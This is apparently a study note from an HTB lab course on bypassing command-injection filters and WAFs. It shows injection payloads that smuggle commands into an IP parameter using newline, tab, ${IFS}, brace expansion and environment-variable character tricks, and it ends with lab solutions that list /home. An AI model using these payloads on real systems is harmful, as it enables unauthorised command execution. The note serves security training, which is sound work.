# Filter Evasion

## Filter/WAF Detection

We can see that if we try the previous operators we tested, like (`;`, `&&`, `||`), we get the error message `invalid input`:

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

&#x20;`If the error message displayed a different page, with information like our IP and our request, this may indicate that it was denied by a WAF`.

```bash
127.0.0.1; whoami
```

### Identifying Blacklisted Character

We know that the (`127.0.0.1`) payload does work, so let us start by adding the semi-colon (`127.0.0.1;`):

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

## Bypassing Space Filters and Spaces

### **Using Tabs**

Using tabs (%09) as both Linux and Windows accept commands with tabs between arguments. So, let us try to use a tab instead of the space character (`127.0.0.1%0a%09`) and see if our request is accepted:

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

### **Using $IFS**

Using the ($IFS) Linux Environment Variable may also work since its default value is a space and a tab. So, if we use `${IFS}` where the spaces should be, the variable should be automatically replaced with a space, and our command should work.

Let us use `${IFS}` and see if it works (`127.0.0.1%0a${IFS}`):

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

### **Using Brace Expansion**

```shell-session
eldeim@htb[/htb]$ {ls,-la}

total 0
drwxr-xr-x 1 21y4d 21y4d   0 Jul 13 07:37 .
drwxr-xr-x 1 21y4d 21y4d   0 Jul 13 13:01 ..
```

By using brace expansion on our command arguments, like (`127.0.0.1%0a{ls,-la}`). To discover more space filter bypasses, check out the [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space) page on writing commands without spaces.

## Bypassing Other Blacklisted Characters

### Linux

#### **Get a slash (`/`):**

```bash
${PATH:0:1}
```

* The `$PATH` variable usually starts with `/`, e.g., `/usr/local/bin:/usr/bin:/bin`.
* So `${PATH:0:1}` extracts the **first character**, which is `/`.

***

#### &#x20;**Get a semi-colon (`;`):**

```bash
${LS_COLORS:10:1}
```

* The `$LS_COLORS` variable often includes formatting values like `di=01;34:`, and the `;` appears early in the string.
* So this substring gives you a `;`.

***

#### **Get a space:**

```bash
${IFS}
```

* `${IFS}` stands for **Internal Field Separator**.
* By default, this is a **space** in Bash.

<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

### PoCs - Questions

Use what you learned in this section to find name of the user in the '/home' folder. What user did you find?

In this case, first we need identificate the command injection, we need try all simple and encoder characters -->

{% embed url="https://app.gitbook.com/o/ASYFlzT9juOjRPrhL5PH/s/SrcwXlKGkwhzbrKa8vLU/~/changes/120/htb-cbbh/command-injections/exploitation" %}

The I can see, with the character "%0a" == New Line == \n with out encode, the peticion found

<figure><img src="../../.gitbook/assets/image (69).png" alt=""><figcaption></figcaption></figure>

Now we need go to the /home directory, we can do it out too methods

#### Method 1 -  Path Traversal:

The with "&0a" we can put a command, for example, "ls" and it print the current directory, and we can too write anothers metods for do a path traversal, the objective is to make == "ls ../../../home" but it, block the backend. We can use operators:

```
echo ${IFS} == SPACE
echo ${PATH:0:1}
/
```

<pre><code><strong>ip=127.0.0.1%0als${IFS}..${PATH:0:1}..${PATH:0:1}..${PATH:0:1}home
</strong></code></pre>

#### Method 3 - Command Ejecution

We can use a similar method with too ${PWD:0:1}

```
ip=127.0.0.1%0als${IFS}-la${IFS}${PWD:0:1}home
```

## Bypassing Blacklisted Commands

### Commands Blacklist



